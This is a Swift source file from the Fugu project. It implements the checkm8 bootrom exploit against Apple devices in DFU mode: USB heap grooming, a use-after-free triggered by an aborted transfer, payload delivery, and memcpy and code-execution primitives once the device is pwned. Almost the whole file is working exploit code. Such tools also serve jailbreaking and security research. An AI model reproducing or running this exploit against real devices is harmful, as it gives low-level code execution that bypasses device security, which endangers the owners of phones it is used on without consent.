//
//  PwnUSB.swift
//  Fugu
//
//  Created by Linus Henze on 13.10.19.
//  Copyright © 2019/2020 Linus Henze. All rights reserved.
//

import Foundation

fileprivate func emptyData(withSize: Int) -> Data {
    return Data(repeating: 0x41, count: withSize)
}

class PwnException: USBException {
    
}

let DFU_DNLOAD:    UInt8 = 1
let DFU_GETSTATUS: UInt8 = 3
let DFU_ABORT:     UInt8 = 4

class PwnUSB<Implementation: PwnUSBDeviceImplementation> {
    private var _device: SimpleUSB<Implementation>! = nil
    private var _config: PwnUSBDeviceConfig! = nil
    private var _ecid: String! = nil
    private var _serialNumber: String = ""
    private var _nonceDescriptor: String = ""
    
    var device: SimpleUSB<Implementation>! { get { _device } }
    var config: PwnUSBDeviceConfig! { get { _config } }
    var ecid: String { get { _ecid! } }
    var serialNumber: String { get { _serialNumber } }
    var nonceDescriptor: String { get { _nonceDescriptor } }
    
    var pwned: Bool {
        get {
            if serialNumber.contains("PWND:[checkm8]") {
                return true
            }
            
            return false
        }
    }
    
    var apNonce: String {
        get {
            // init guarantees that this will succeed
            let start = nonceDescriptor.range(of: "NONC:")!.upperBound
            
            let cropped = nonceDescriptor[start...]
            if let end = cropped.range(of: " ")?.lowerBound {
                return String(cropped[..<end])
            } else {
                return String(cropped)
            }
        }
    }
    
    var sepNonce: String {
        get {
            // init guarantees that this will succeed
            let start = nonceDescriptor.range(of: "SNON:")!.upperBound
            
            let cropped = nonceDescriptor[start...]
            if let end = cropped.range(of: " ")?.lowerBound {
                return String(cropped[..<end])
            } else {
                return String(cropped)
            }
        }
    }
    
    // Stuff for pwned DFU
    func memcpy(data: [UInt8], to: UInt64) -> Bool {
        return memcpy(data: Data(data), to: to)
    }
    
    func memcpy(data: Data, to: UInt64) -> Bool {
        var data = data
        if data.count > 0x400 {
            let upper = Data(Array<UInt8>(data[0x400...]))
            data = Data(Array<UInt8>(data[..<0x400]))
            guard memcpy(data: upper, to: to + 0x400) else {
                return false
            }
        }
        
        let dataLocation: UInt64 = config.dfuUploadBase + 16 /* 8s8x */ + 8 * 3 /* 3Q */
        let MEMC_MAGIC = String("memcmemc".reversed())
        let command = struct_pack("<8s8x3Qs", MEMC_MAGIC, to, dataLocation, UInt64(data.count), data)
        do {
            _ = try doCMD(param: command, resultLength: 0)
            return true
        } catch {
            return false
        }
    }
    
    func memcpy(from: UInt64, to: UInt64, length: Int) -> Bool {
        let MEMC_MAGIC = String("memcmemc".reversed())
        let command = struct_pack("<8s8x3Q", MEMC_MAGIC, to, from, UInt64(length))
        do {
            _ = try doCMD(param: command, resultLength: 0)
            return true
        } catch {
            return false
        }
    }
    
    func runCode(at: UInt64, arg1: UInt64 = 0, arg2: UInt64 = 0, arg3: UInt64 = 0, arg4: UInt64 = 0) -> Bool {
        let EXEC_MAGIC = String("execexec".reversed())
        let command = struct_pack("<8s5Q", EXEC_MAGIC, at, arg1, arg2, arg3, arg4)
        do {
            _ = try doCMD(param: command, resultLength: 0)
            return true
        } catch {
            return false
        }
    }
    
    func dfuAbort(doNotReacquire: Bool = false) throws {
        try device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_ABORT, value: 0, index: 0, data: Data())
        device.reset()
        
        if !doNotReacquire {
            try acquire_device()
        }
    }
    
    func doCMD(param: Data, resultLength: Int) throws -> Data {
        var resultLength = resultLength
        
        // Send some data
        try device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_DNLOAD, value: 0, index: 0, data: emptyData(withSize: 16), timeout: 0)
        
        // Get into SYNC
        try device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_DNLOAD, value: 0, index: 0, data: Data(), timeout: 0)
        
        // Get into MANIFEST
        _ = try device.requestFromDevice(type: .Class, recipient: .Interface, request: DFU_GETSTATUS, value: 0, index: 0, size: 6, timeout: 0)
        
        // Get into RESET
        _ = try device.requestFromDevice(type: .Class, recipient: .Interface, request: DFU_GETSTATUS, value: 0, index: 0, size: 6, timeout: 0)
        
        // Size has been reset to 0, send command now
        try device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_DNLOAD, value: 0, index: 0, data: param, timeout: 0)
        
        if resultLength == 0 {
            resultLength = 1
        }
        
        // Execute command, get result
        return try device.requestFromDevice(type: .Class, recipient: .Interface, request: 2, value: 0xFFFF, index: 0, size: resultLength, timeout: 0)
    }
    
    init(ecid: String? = nil) throws {
        if let ecid = ecid {
            self._ecid = ecid
        }
        
        try acquire_device()
        
        let config = try configForDevice(device)
        self._config = config
        
        guard let serialNumber = device.serialNumber else {
            throw PwnException(message: "Device has no serial number!")
        }
        
        self._serialNumber = serialNumber
        
        guard let nonceDescriptor = device.device.nonceDescriptor else {
            throw PwnException(message: "Device has no nonce descriptor!")
        }
        
        self._nonceDescriptor = nonceDescriptor
        
        guard nonceDescriptor.contains("NONC:") && nonceDescriptor.contains("SNON:") else {
            throw PwnException(message: "Device has invalid nonce descriptor!")
        }
        
        if ecid == nil {
            guard let ecidStart = serialNumber.range(of: "ECID:")?.upperBound else {
                throw PwnException(message: "Device serial number does not contain ECID!")
            }
            
            guard let ecidEnd = serialNumber[ecidStart...].range(of: " ")?.lowerBound else {
                throw PwnException(message: "Device serial number has unexpected format!")
            }
            
            self._ecid = String(serialNumber[ecidStart ..< ecidEnd])
        }
    }
    
    func exploit(status: StatusIndicator?) throws {
        guard device.serialNumber != nil else {
            throw PwnException(message: "Device has no serial number!")
        }
        
        if pwned {
            return
        }
        
        status?.update("Leaking memory")
        
        stall()
        if config.largeLeak {
            for _ in 0..<config.leak {
                leak()
            }
            
            no_leak()
        } else {
            for _ in 0..<config.hole {
                no_leak()
            }
            
            leak()
            no_leak()
        }
        
        device.reset()
        
        usleep(100)
        
        try acquire_device()
        
        status?.update("Triggering UaF")
        
        guard device.serialNumber != nil else {
            throw PwnException(message: "Device has no serial number!")
        }
        
        let bmRequestType = makeRequestType(direction: .HostToDevice, type: .Class, recipient: .Interface)
        let dataSent = try device.device.asyncAbortedTransferToDevice(requestType: bmRequestType, request: DFU_DNLOAD, value: 0, index: 0, size: 0x800, abortAfterUSec: 15)
        
        guard config.overwriteOffset > Int(dataSent) else {
            throw PwnException(message: "Aborted transfer failed!")
        }
        
        // They will throw errors but succeed anyway
        _ = try? device.sendToDevice(type: .Standard, recipient: .Device, request: 0, value: 0, index: 0, data: emptyData(withSize: config.overwriteOffset - Int(dataSent)), timeout: 10)
        _ = try? device.sendToDevice(type: .Class, recipient: .Interface, request: 4, value: 0, index: 0, data: Data())
        device.close()
        
        usleep(UInt32(Double(USEC_PER_SEC) * 0.5))
        
        try acquire_device()
        
        status?.update("Leaking memory again")
        
        stall(forceLargeLeakVersion: true)
        if config.largeLeak {
            leak(forceLargeLeakVersion: true)
        } else {
            for _ in 0..<config.leak {
                leak(forceLargeLeakVersion: true)
            }
        }
        
        status?.update("Sending stage 1")
        
        _ = try? device.sendToDevice(type: .Standard, recipient: .Device, request: 0, value: 0, index: 0, data: config.overwrite)
        
        var payload = config.payload
        while payload.count != 0 {
            let sizeToSend = payload.count > 0x800 ? 0x800 : payload.count
            _ = try? device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_DNLOAD, value: 0, index: 0, data: payload.prefix(upTo: sizeToSend), timeout: 50)
            
            if payload.count > 0x800 {
                payload = payload.advanced(by: 0x800)
            } else {
                break
            }
        }
        
        device.reset()
        usleep(100)
        device.close()
        
        usleep(UInt32(Double(USEC_PER_SEC) * 0.5))
        
        try acquire_device()
        
        guard device.serialNumber != nil else {
            throw PwnException(message: "Device has no serial number!")
        }
        
        if !pwned {
            throw PwnException(message: "Exploit failed! Did not enter pwned DFU!")
        }
    }
    
    func acquire_device() throws {
        let end_time = time(nil) + 5
        var openFailed = false
        
        while time(nil) <= end_time {
            let devices = SimpleUSB<Implementation>.devicesWith(vid: 0x5AC, pid: 0x1227)
            for dev in devices {
                do {
                    try dev.openExclusive()
                    if _ecid == nil {
                        _device = dev
                        return
                    } else {
                        if dev.serialNumber?.contains("ECID:\(ecid)") ?? false {
                            _device = dev
                            
                            guard let serialNumber = device.serialNumber else {
                                throw PwnException(message: "Device has no serial number!")
                            }
                            
                            self._serialNumber = serialNumber
                            
                            return
                        }
                    }
                    
                    dev.close()
                } catch {
                    openFailed = true
                    continue
                }
            }
            usleep(1000)
        }
        
        if openFailed {
            throw USBException(message: "Device could not be found or opened!")
        }
        
        throw USBException(message: "Device could not be found!")
    }
    
    private func stall(forceLargeLeakVersion: Bool = false) {
        if config.largeLeak || forceLargeLeakVersion {
            _ = try? device.sendToDevice(type: .Standard, recipient: .Endpoint, request: 3, value: 0, index: 0x80, data: Data(), timeout: 10)
        } else {
            _ = try? device.device.asyncAbortedTransferToDevice(requestType: 0x80, request: 6, value: 0x304, index: 0x40A, size: 0xC0, abortAfterUSec: 10)
        }
    }
    
    private func leak(forceLargeLeakVersion: Bool = false) {
        if config.largeLeak || forceLargeLeakVersion {
            _ = try? device.requestFromDevice(type: .Standard, recipient: .Device, request: 6, value: 0x304, index: 0x40A, size: 0x40)
        } else {
            _ = try? device.requestFromDevice(type: .Standard, recipient: .Device, request: 6, value: 0x304, index: 0x40A, size: 0xC0)
        }
    }
    
    private func no_leak() {
        if config.largeLeak {
            _ = try? device.requestFromDevice(type: .Standard, recipient: .Device, request: 6, value: 0x304, index: 0x40A, size: 0x41)
        } else {
            _ = try? device.requestFromDevice(type: .Standard, recipient: .Device, request: 6, value: 0x304, index: 0x40A, size: 0xC1)
        }
    }
}
